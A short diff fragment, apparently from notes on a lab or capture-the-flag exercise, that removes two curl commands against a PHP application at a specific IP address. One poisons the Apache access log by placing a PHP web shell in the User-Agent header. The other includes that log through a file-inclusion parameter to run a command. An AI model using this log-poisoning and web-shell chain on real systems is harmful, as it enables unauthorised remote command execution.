@@ -37,7 +37,3 @@ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.lo
 
 
 
-
-curl -s "http://94.237.54.116:36544/index.php?language=/var/log/apache2/access.log&cmd=pwd"
-
-curl -s 'http://94.237.54.116:58945/index.php' -A '<?php system($_GET["cmd"]); ?>'
